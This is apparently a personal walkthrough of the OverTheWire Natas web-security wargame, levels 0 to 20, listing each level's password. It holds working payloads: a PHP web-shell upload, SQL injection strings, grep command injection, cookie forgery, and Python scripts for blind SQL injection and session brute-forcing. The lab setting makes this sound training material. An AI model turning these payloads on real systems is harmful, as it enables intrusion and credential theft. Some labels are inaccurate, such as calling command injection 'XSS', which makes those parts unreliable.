# Natas

> [!QUOTE] Natas
> Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.
> Each level has access to the password of the next level. My job is to somehow obtain that next password and level up.

## Level 0

View the source code and find the password.

**Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq**

![password](./pictures/level0/password.png)

## Level 1

Also view the source code and find the password.

**Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI**

![password](./pictures/level1/password.png)

## Level 2

At first, I looked for the password in the code the same way I did before. But I didn't find it. But it's worth noting this code: `<img src="files/pixel.png">`. This indicates that there is a directory called files on the web root. Maybe I have access to files in this directory.

![elements](./pictures/level2/elements.png)

Let's see what's in there.

![files](./pictures/level2/files.png)

As the screenshot shown, there is a file called users.txt. After opening it, I found the password.

**Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH**

![password](./pictures/level2/password.png)

## Level 3

Similarily, I check the source code firstly. Here I found a comment said "No more information leaks!! **Not even Google will find it this time**". It gave me a hint that there might be a "robots.txt" used by website to instruct web crawlers about which pages they can or cannot access.

![elements](./pictures/level3/elements.png)

So I tried to access this robots.txt. Then I found that the **s3cr3t** directory is disallowed.

![robots](./pictures/level3/robots.png)

After accessing this folder, I again found the `users.txt` file.

![s3cr3t](./pictures/level3/s3cr3t.png)

After opening it, I obtained the password from users.txt.

**Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ**

![password](./pictures/level3/password.png)

## Level 4

I used the password extracted from the previous level to login into level 4. Then I got a message as shown in the screenshot below.

![page](./pictures/level4/page.png)

I thought this should be a referrer spoofing attack. So I used Burp Suite to modify the referrer in the request.

![origin](./pictures/level4/origin.png)
![modified](./pictures/level4/modified.png)

After forwarding, I got the password.

**Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK**

![password](./pictures/level4/password.png)

## Level 5

After logging, I got the page as the screenshot shown:

![disallowed](./pictures/level5/disallowed.png)

Then I checked the cookie and found a variable named loggedin. The value of this variable is 0. So I changed it to 1 and got the password.

**Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned**

![allowed](./pictures/level5/allowed.png)

## Level 6

After logging, I got the page as the screenshot shown:

![page](./pictures/level6/page.png)

After clicking the "View sourcecode", I found that there is a file named "include/secret.inc". So I input this path in the url and got the secret.

![sourcecode](./pictures/level6/sourcecode.png)
![secret](./pictures/level6/secret.png)

Then I input the secret and got the password.

**Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS**

![password](./pictures/level6/password.png)

## Level 7

The page is shown below:

![page](./pictures/level7/page.png)

I checked the elements of page first and found that there was a hint.

![hind](./pictures/level7/hint.png)

It said that the password is in `/etc/natas_webpass/natas8`. At the same time, I found that the corresponding link on the Home page is `index.php?page=home`, which means I can change the value of parameter `page` to `/etc/natas_webpass/natas8`. Let's try and see what will happen.

![password](./pictures/level7/password.png)

Then I got the password.

**Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q**

## Level 8

![page](./pictures/level8/page.png)

I clicked the "View sourcecode" button and found a variable named "encodedSecret". That means if I input the decoded secret, I will get the password.

![sourcecode](./pictures/level8/sourcecode.png)

The code used to decode the `encodeSecret` is as follows:

```php
echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));

// Output: oubWYf2kBq
```

After inputing secret, I got the password.

**Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t**

![password](./pictures/level8/password.png)

## Level 9

![page](./pictures/level9/page.png)

Similarly, I checked the source code first. I found that it uses `grep` command which means I can use XSS injection to get the password.

![source code](./pictures/level9/sourcecode.png)

I input the code below:

```bash
.* /etc/natas_webpass/natas10

# So the command is: grep -i .* /etc/natas_webpass/natas10 dictionary.txt
```

Then I got the password.

**Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu**

![password](./pictures/level9/password.png)

## Level 10

![page](./pictures/level10/page.png)

Similarly, I checked the source code first. I found that comparing to last level, this challenge filters some key characters to command injection. However, the filtered characters did not affect our previous approach, so the solution at the previous level is still valid.

![source code](./pictures/level10/sourcecode.png)

Input the same code in the last level and get the password.

**Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk**

![password](./pictures/level10/password.png)

## Level 11

![page](./pictures/level11/page.png)

I checked the source code first. I found that this challenge not only filtered many key chararcters to command injection, but also added serveral layers of encryption to the data.

![source code](./pictures/level11/sourcecode.png)

I drew a diagram to simply illustrate this process.

![process](./pictures/level11/process.png)

As the diagram shown, we need to get the value of key and change the cookie to my encoded data.

```php
$originalString = json_encode(array("showpassword" => "no", "bgcolor" => "#ffffff"));
$cookieString = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GdGdfVXRnTRg%3D");

echo $originalString ^ $cookieString;

// Output: eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe93oe
// Key: eDWo
```

I used the key to encode my data as the code shown below.

```php
$key = "eDWo";
$newString = json_encode(array("showpassword" => "yes", "bgcolor" => "#ffffff"));
$newCookieString = "";

for ($i = 0; $i < strlen($newString); $i++) {
    $newCookieString .= $key[$i % strlen($key)] ^ $newString[$i];
}

echo base64_encode($newCookieString);

// Output: HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```

After modifying the cookie to the output string, I got the password.

**Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB**

![password](./pictures/level11/password.png)

## Level 12

![page](./pictures/level12/page.png)

Check the source code first. I found that the program seems to save the uploaded file at a random path.

![source code](./pictures/level12/sourcecode.png)

I tried to upload a php file and found that the uploaded file was modified to a JPG file.

![upload php](./pictures/level12/upload_php.png)
![upload result](./pictures/level12/upload_result.png)

The content in `level12.php` is shown below.

```php
<?php

echo exec("cat /etc/natas_webpass/natas13");
```

Maybe I need Burp Suite to change JPG to PHP.

![burpsuite](./pictures/level12/burpsuite.png)

After forwarding, I successfully uploaded the PHP file.

![upload success](./pictures/level12/upload_success.png)

Click on the file and it works! I got the password.

**Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**

![password](./pictures/level12/password.png)

## Level 13

![page](./pictures/level13/page.png)

Check the source code first. Compared to last level, I found that this challenge has restrictions on uploaded files. So I needed to bypass this restriction.

![source code](./pictures/level13/sourcecode.png)

Let's use Burp Suite to convert images into PHP file like last time. But this time I needed to upload an image file first.

![upload image](./pictures/level13/upload_image.png)
![request](./pictures/level13/request.png)

Change the JPG file to PHP file.

![changed request](./pictures/level13/changed_request.png)

After forwarding, I successfully uploaded the PHP file.

![upload success](./pictures/level13/upload_success.png)

Click the file to get the password.

**Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**

![password](./pictures/level13/password.png)

## Level 14

![page](./pictures/level14/page.png)

Check the source code first. I found the SQL statement. So this challenge is a easy SQL injection level.

![source code](./pictures/level14/sourcecode.png)

Input the code below to get the password.

```bash
" OR 1=1; #
```

**Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**

![password](./pictures/level14/password.png)

## Level 15

![page](./pictures/level15/page.png)

Check the source code first. Compared to last level, I found that this challenge does not directly output the password, but only outputs information when SQL statement is executed successfully. And the information is "This user exists." when result is more than 1 row. Therefore, I can exploit this to perform a **Boolean blind injection**.

![source code](./pictures/level15/sourcecode.png)

I wrote a python script to brute force it.

```python
import requests

words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url = "http://natas15.natas.labs.overthewire.org"

session = requests.Session()

current_pw = ""
n = 0

while True:
    for ch in words:
        n += 1
        temp_pw = current_pw + ch
        print(f"Try {n} times: {temp_pw}")

        response = session.post(
            url,
            data={"username": 'natas16" AND password LIKE BINARY "' + temp_pw + '%" #'},
            auth=(username, password),
        )

        if "exists" in response.text:
            current_pw += ch
            break

    if len(current_pw) == 32:
        print("Finish!")
        break
```

After trying 955 times, I got the password.

**Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**

![password](./pictures/level15/password.png)

## Level 16

![page](./pictures/level16/page.png)

Check the source code first. I found that challenge filters many key characters to command injections. But good news is that I can still inject some other command like `grep`. At the same time, combine whether the first result found is different (i.e., Boolean blind injection) to determine whether the next password is correct.

![source code](./pictures/level16/sourcecode.png)

I wrote a python script to brute force the password.

```python
import requests
from requests.auth import HTTPBasicAuth

words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
url = "http://natas16.natas.labs.overthewire.org/"
natas17_pw = ""

n = 0
while True:
    for ch in words:
        n += 1
        temp_pw = natas17_pw + ch
        print(f"Try {n} times: {temp_pw}")

        payload = f"^$(grep -o ^{temp_pw} /etc/natas_webpass/natas17)A"
        params = {"needle": payload, "submit": "Search"}
        response = requests.get(
            url, auth=HTTPBasicAuth(username, password), params=params
        )

        result = response.text
        start = result.find("<pre>\n") + len("<pre>\n")
        end = result.find("</pre>")
        result_list = [x for x in result[start:end].split("\n")]

        if result_list[0] != "African":
            natas17_pw = temp_pw
            break

    if len(natas17_pw) == 32:
        print("Finish!")
        break
```

> When the current password attempt is correct, the `grep` command will match a result, so that the first search result is not "Africans".

After trying 1048 times, I got the password.

**Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC**

![password](./pictures/level16/password.png)

## Level 17

![page](./pictures/level17/page.png)

Check the source code first. I found that all output statements have been commented out. However, SQL injection vulnerabilities can still be exploited. Therefore, I can use the sleep function to perform a time-based blind injection attack.

![source code](./pictures/level17/sourcecode.png)

I wrote a python script to run the attack.

```python
import requests
import time

words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url = "http://natas17.natas.labs.overthewire.org/"
natas18_pw = ""

n = 0
session = requests.session()
while True:
    for ch in words:
        n += 1
        temp_pw = natas18_pw + ch
        print(f"Try {n} times: {temp_pw}")

        startTime = time.time()

        payload = f'natas18" AND password LIKE BINARY "' + temp_pw + '%" AND SLEEP(2) #'
        response = session.post(
            url, data={"username": payload}, auth=(username, password)
        )

        endTime = time.time()

        if endTime - startTime > 2:
            natas18_pw = temp_pw
            break

    if len(natas18_pw) == 32:
        print("Finish!")
        break
```

After trying 803 times, I got the password.

**Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ**

![password](./pictures/level17/password.png)

## Level 18

![page](./pictures/level18/page.png)

Check the source code first. But I didn't find any clues. I tried to login with some name and admin but it shows the same thing.

![source code](./pictures/level18/sourcecode.jpeg)

So I analyzed the code.

1. At first, `createID()` generates a random integer between 1 and 640 as PHPSESSID.

2. Then I discovered that the `isValidAdminLogin()` function for admin user verification was commented out and always returned 0. This means that normal logins cannot obtain administrator privileges (`$_SESSION["admin"]=0`).

3. The session startup mechanism is: `my_session_start()` restores the session using `PHPSESSID` in the cookie. When admin=1 in the session, the password is displayed, but this value cannot be set normally.

Therefore, the key to obtaining the password lies in using a valid administrator session ID (the server may retain historical administrator sessions). So I can use BurpSuite to try `PHPSESSID` from 1 to 640.

![password](./pictures/level18/password.png)

**Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr**

## Level 19

![page](./pictures/level19/page.png)

I saw a prompt on the page saying that the source code for this time is the same as the previous level, but the `PHPSESSID` are no longer sequential. So I used BurpSuite to check the value of this variable.

![PHPSESSID](./pictures/level19/phpsessid.png)

This string may have been encoded. Therefore, I tried various decoding methods on this string. Finally, I found that it was hexadecimal encoding. As shown in the image below, I found that it was in the format of `PHPSESSID-username`.

![decode result](./pictures/level19/decode-result.png)

Therefore, I can brute force the `PHPSESSID` based on it. I wrote a python script to perform the attack.

```python
import requests
from requests.auth import HTTPBasicAuth
import binascii

username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
url = "http://natas19.natas.labs.overthewire.org/"

begin = input("Input the begin id: ")
end = input("input the end id: ")
for i in range(int(begin), int(end)):
    session_id = f"{i}-admin"
    hex_str = binascii.hexlify(session_id.encode()).decode()

    cookies = {"PHPSESSID": hex_str}
    response = requests.get(
        url, auth=HTTPBasicAuth(username, password), cookies=cookies
    )

    print(f"Session {i}: {hex_str}")

    if "You are an admin" in response.text:
        start = response.text.find("Password: ") + 10
        end = response.text.find("</pre>", start)

        natas20_pw = response.text[start:end].strip()
        print(f"Password: {natas20_pw}")
        print("Finish!")
        break
```

After several attempts, I obtained the password when the `PHPSESSID` was 281.

**Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw**

![password](./pictures/level19/password.png)

## Level 20

![page](./pictures/level20/page.png)

Check the source code first. I found that this function, which writes conversation data to a file, does not filter `\n` when processing input data. This means that I can inject multiple elements and assign values to them. Here, I need to inject `admin 1`.

![source code](./pictures/level20/sourcecode.jpeg)
![vulnerability](./pictures/level20/vulnerability.png)

Then open Burp Suite and intercept the request.

![burp suite](./pictures/level20/burpsuite.png)

After forwarding, the server wrote the injected content to the session file. At the same time, in order for the program to output debug information, I need to add a "debug" parameter to the URL to get debug information for the last operation.

![debug](./pictures/level20/debug.png)

Then I got the password.

**Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH**

![password](./pictures/level20/password.png)
